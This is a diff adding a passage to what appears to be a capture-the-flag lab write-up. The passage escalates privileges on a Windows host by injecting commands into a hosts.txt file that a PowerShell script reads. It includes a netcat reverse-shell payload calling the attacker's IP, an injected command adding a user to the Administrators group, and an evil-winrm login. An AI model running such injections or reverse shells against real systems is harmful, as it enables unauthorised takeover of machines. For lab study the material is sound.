@@ -370,7 +370,52 @@ At this point I tried to access the Users shared folder as brittanycr (note that
     smb: \brittanycr\> get hosts.txt 
     getting file \brittanycr\hosts.txt of size 22 as hosts.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
 
-    
+Inspecting the file content:
+
+    cat hosts.txt           
+    google.com
+    cisco.com
+At this point we can chain a malicious command to get a shell. My idea was to upload netcat on the server and execute a reverse shell. So first I uploaded netcat to the server:
+
+    mb: \brittanycr\> put nc64.exe
+    putting file nc64.exe as \brittanycr\nc64.exe (105.6 kb/s) (average 105.6 kb/s)
+
+Then I modified the hosts file as follows:
+
+    google.com; C:\Users\brittanycr\nc64.exe 10.9.1.97 1234 -e cmd 
+
+So I expected that the script will execute the following:
+
+    $p = "Test-Connection -ComputerName google-com; C:\Users\brittanycr\nc64.exe 10.9.1.97 1234 -e cmd -Count 1 -ea silentlycontinue"
+
+And I uploaded the modified version of the file
+
+    smb: \brittanycr\> put hosts.txt 
+    putting file hosts.txt as \brittanycr\hosts.txt (0.2 kb/s) (average 56.4 kb/s)
+    smb: \brittanycr\> ls
+      .                                   D        0  Tue Jul  2 09:22:16 2024
+      ..                                  D        0  Tue Jul  2 09:22:16 2024
+      hosts.txt                           A       72  Tue Jul  2 09:29:24 2024
+      nc64.exe                            A    43696  Tue Jul  2 09:22:16 2024
+
+I started a netcat listener on my attacker machine but I never get a shell back, actually I dont' know why. At this point, as suggested in other write-up I tried to add a user to the local administrators group. I modified the hosts file as follows (leave an empty space at the end of the string):
+
+    google.com; net localgroup Administrators buse /add  
+
+Then I uploaded the file, wait a minute and get a shell again using buse user:
+
+    evil-winrm -i 10.10.169.134 -u buse -p xxxxxxx+nnnn
+    ...
+    Info: Establishing connection to remote endpoint
+    *Evil-WinRM* PS C:\Users\buse\Documents> whoami /groups
+    ...
+    Group Name                                 Type             SID                                          Attributes
+    ========================================== ================ ============================================ ===============================================================
+    Everyone                                   Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+    BUILTIN\Administrators                     Alias            S-1-5-32-544              
+    ...
+
+So being administrator we can get the last flag in C:\users\administrator\desktop
 
 
     
